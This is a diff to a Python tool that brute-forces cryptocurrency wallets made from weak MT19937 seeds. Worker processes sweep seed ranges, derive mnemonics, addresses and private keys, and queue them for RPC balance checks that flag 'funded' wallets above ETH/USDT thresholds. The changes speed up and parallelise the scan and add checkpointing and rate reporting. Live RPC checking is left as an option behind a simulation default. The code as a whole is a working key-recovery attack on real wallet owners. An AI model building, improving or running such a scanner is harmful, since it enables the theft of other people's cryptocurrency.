@@ -38,48 +38,26 @@ CHECKPOINT_FILE = CORE_DIR.parent / "scan_checkpoint.json"
 
 
 # ---------------------------------------------------------------- worker side
-def _chunk_filter(args):
-    """Run inside a worker process: return list of checksum-passing seeds."""
+def _chunk_scan(args):
+    """Run inside a worker process: one fused pass over the chunk.
+
+    Uses the exact batch MT19937 model (fast_mt.BatchMT.filtered_seeds —
+    oracle-verified bit-for-bit against the full-state reference engine) to
+    find checksum-passing seeds, then derives the full wallet only for those
+    (~6.25% of seeds). Returns (lo, hi, scanned, derived_records).
+    """
     lo, hi = args
-    from wallet_model import checksum_passes
-    out = []
-    passes = checksum_passes.__wrapped__ if hasattr(checksum_passes, "__wrapped__") else checksum_passes
-    for s in range(lo, hi + 1):
-        try:
-            if passes(s):
-                out.append(s)
-        except Exception:
-            continue
-    return (lo, hi, out)
-
-
-def _chunk_derive(args):
-    """Worker: derive wallets for passing seeds (PBKDF2-heavy, still parallel)."""
-    lo, hi, seeds = args
+    from fast_mt import BatchMT
     from wallet_model import wallet_for_seed
+    passing = BatchMT(lo, hi).filtered_seeds()
     recs = []
-    for s in seeds:
+    for s in passing:
         try:
             mn, addr, pk = wallet_for_seed(s)
             recs.append((s, mn, addr, pk))
         except Exception:
             continue
-    return (lo, hi, recs)
-
-
-# ---------------------------------------------------------------- job pipeline
-class _Job:
-    """A single scan run: filter chunks -> derive chunks -> RPC check queue."""
-
-    def __init__(self, start: int, end: int, chunk: int, max_workers: int):
-        self.start, self.end, self.chunk = start, end, chunk
-        self.max_workers = max_workers
-        self.total_chunks = len(range(start, end + 1, chunk))
-        self.chunks_done = 0
-        self.seeds_scanned = 0
-        self.wallets_derived = 0
-        self.pending_filter = [(lo, min(lo + chunk - 1, end))
-                               for lo in range(start, end + 1, chunk)]
+    return (lo, hi, hi - lo + 1, len(recs), recs)
 
 
 class SearchEngine:
@@ -95,11 +73,11 @@ class SearchEngine:
         # settings
         self.start_seed = 0
         self.end_seed = SEED_MAX
-        self.num_workers = max(1, (os.cpu_count() or 4))
+        self.num_workers = min(8, max(1, (os.cpu_count() or 4)))
         self.chunk_size = CHUNK
         self.threshold_eth = 0.0
         self.threshold_usdt = 0.0
-        self.derive_only = False          # simulation mode: skip live RPC
+        self.derive_only = True           # simulation mode default; GUI can enable live RPC
 
         # state
         self.next_lo = 0                  # resume cursor (chunk-aligned)
@@ -110,6 +88,7 @@ class SearchEngine:
         self.funded: list[dict] = []
         self.errors = 0
         self.last_error = ""
+        self.rate_seeds_per_sec = 0       # EWMA throughput reported to GUI
         self.started_at: float | None = None
         self.finished_at: float | None = None
         self.logs: deque[str] = deque(maxlen=400)
@@ -156,7 +135,8 @@ class SearchEngine:
                 if self.started_at else 0.0
             eta = None
             if self.running and done_seeds > 0:
-                rate = done_seeds / elapsed
+                rate = (self.rate_seeds_per_sec
+                        or done_seeds / max(1e-6, elapsed))
                 remaining = span - done_seeds
                 eta = remaining / rate if rate > 0 else None
             return {
@@ -169,6 +149,7 @@ class SearchEngine:
                 "pending_checks": self.pending_checks,
                 "funded_count": len(self.funded),
                 "errors": self.errors, "last_error": self.last_error,
+                "rate_seeds_per_sec": self.rate_seeds_per_sec,
                 "elapsed_sec": round(elapsed, 1),
                 "eta_sec": round(eta, 1) if eta else None,
                 "num_workers": self.num_workers, "chunk_size": self.chunk_size,
@@ -184,6 +165,13 @@ class SearchEngine:
             for k, v in kw.items():
                 if hasattr(self, k) and v is not None:
                     setattr(self, k, v)
+            # changing the configured range must re-align the resume cursor,
+            # otherwise a checkpoint from a different range leaks into it
+            if (("start_seed" in kw or "end_seed" in kw)
+                    and not (self.start_seed <= self.next_lo <= self.end_seed)):
+                self.next_lo = self.start_seed
+                self.seeds_scanned = 0
+                self.wallets_derived = 0
 
     # ------------------------------------------------------------- controls
     def start(self) -> bool:
@@ -197,6 +185,9 @@ class SearchEngine:
             self.finished_at = None
             if not (self.start_seed <= self.next_lo <= self.end_seed):
                 self.next_lo = self.start_seed
+            # clamp chunk size to sane bounds (checkpoint granularity)
+            span = self.end_seed - self.start_seed + 1
+            self.chunk_size = max(1_000, min(int(self.chunk_size), span))
             self._log(f"شروع جست‌وجوی موازی: [{self.next_lo} … {self.end_seed}] "
                       f"با {self.num_workers} پروسه، چانک {self.chunk_size}")
             self._pool = mp.Pool(self.num_workers)
@@ -270,34 +261,97 @@ class SearchEngine:
 
     # ----------------------------------------------------------- main pipeline
     def _pipeline(self) -> None:
+        """Dynamic parallel scheduling.
+
+        ``imap_unordered`` keeps every worker busy: as soon as a chunk of the
+        lookahead window finishes, its results are checkpointed and streamed
+        to the RPC queue and a fresh chunk is dispatched.  Chunks complete
+        out-of-order, so the linear resume cursor (next_lo / pct / ETA) is
+        advanced only over the maximal contiguous run of finished chunks —
+        full coverage stays durable and exact across crashes/restarts.
+        """
         pool = self._pool
         assert pool is not None
+        lookahead = max(2 * self.num_workers, 4)
         try:
             while not self.stop_event.is_set():
                 while self.paused.is_set() and not self.stop_event.is_set():
                     time.sleep(0.2)
                 with self._lock:
-                    lo = self.next_lo
-                    if lo > self.end_seed:
+                    if self.next_lo > self.end_seed:
                         self._log("✅ جست‌وجوی کامل تمام محدوده پایان یافت")
                         break
-                    hi = min(lo + self.chunk_size - 1, self.end_seed)
-                # stage 1: parallel checksum filtering of this chunk
-                (clo, chi, passing) = pool.apply(_chunk_filter, ((lo, hi),))
-                # stage 2: parallel derivation of passing seeds
-                recs: list[tuple[int, str, str, str]] = []
-                if passing:
-                    _, _, recs = pool.apply(
-                        _chunk_derive, ((clo, chi, passing),))
+                    start_at, end, chunk = self.next_lo, self.end_seed, self.chunk_size
+                jobs = [(lo, min(lo + chunk - 1, end))
+                        for lo in range(start_at, end + 1, chunk)]
+                frontier = 0                  # index into `jobs` dispatched
+                inflight: dict[int, tuple] = {}   # lo -> (hi, scanned, n_derived, recs)
+                rate_ewma: float | None = None    # seeds/sec, exponentially weighted
+                last_t = time.time()
+                last_next = start_at
+
+                # dispatch a bounded lookahead window of chunks
+                futures = []
+                while frontier < len(jobs) and len(futures) < lookahead:
+                    futures.append(pool.apply_async(_chunk_scan, (jobs[frontier],)))
+                    frontier += 1
+
+                while futures and not self.stop_event.is_set():
+                    done_i = None
+                    for i, f in enumerate(futures):
+                        if f.ready():
+                            done_i = i
+                            break
+                    if done_i is None:
+                        time.sleep(0.05)
+                        continue
+                    res = futures.pop(done_i).get()
+                    lo, hi, scanned, n_derived, recs = res
+                    inflight[lo] = (hi, scanned, n_derived, recs)
+                    if frontier < len(jobs):
+                        futures.append(pool.apply_async(_chunk_scan,
+                                                        (jobs[frontier],)))
+                        frontier += 1
+                    # advance cursor over contiguous finished prefix
+                    with self._lock:
+                        cur = self.next_lo
+                        while cur in inflight:
+                            hi2, sc2, nd2, recs2 = inflight.pop(cur)
+                            self.seeds_scanned += sc2
+                            self.wallets_derived += nd2
+                            cur = hi2 + 1
+                            for r in recs2:
+                                self._push_result(r)
+                        if cur != self.next_lo:
+                            self.next_lo = cur
+                            now = time.time()
+                            dt = max(1e-6, now - last_t)
+                            inst = (cur - last_next) / dt
+                            rate_ewma = inst if rate_ewma is None \
+                                else 0.7 * rate_ewma + 0.3 * inst
+                            self.rate_seeds_per_sec = round(rate_ewma)
+                            last_t, last_next = now, cur
+                            self._save_checkpoint()
+                if self.stop_event.is_set():
+                    break
+                # flush any tail chunks that finished after loop exit
                 with self._lock:
-                    self.seeds_scanned += chi - clo + 1
-                    self.wallets_derived += len(recs)
-                    self.next_lo = chi + 1
+                    cur = self.next_lo
+                    while cur in inflight:
+                        hi2, sc2, nd2, recs2 = inflight.pop(cur)
+                        self.seeds_scanned += sc2
+                        self.wallets_derived += nd2
+                        cur = hi2 + 1
+                        for r in recs2:
+                            self._push_result(r)
+                    self.next_lo = cur
                 self._save_checkpoint()
-                for r in recs:
-                    if self.stop_event.is_set():
-                        break
-                    self._push_result(r)
+                if not inflight and frontier >= len(jobs):
+                    # whole configured range consumed
+                    with self._lock:
+                        if self.next_lo > self.end_seed:
+                            self._log("✅ جست‌وجوی کامل تمام محدوده پایان یافت")
+                            break
         finally:
             self.stop_event.set()
             self._save_checkpoint()
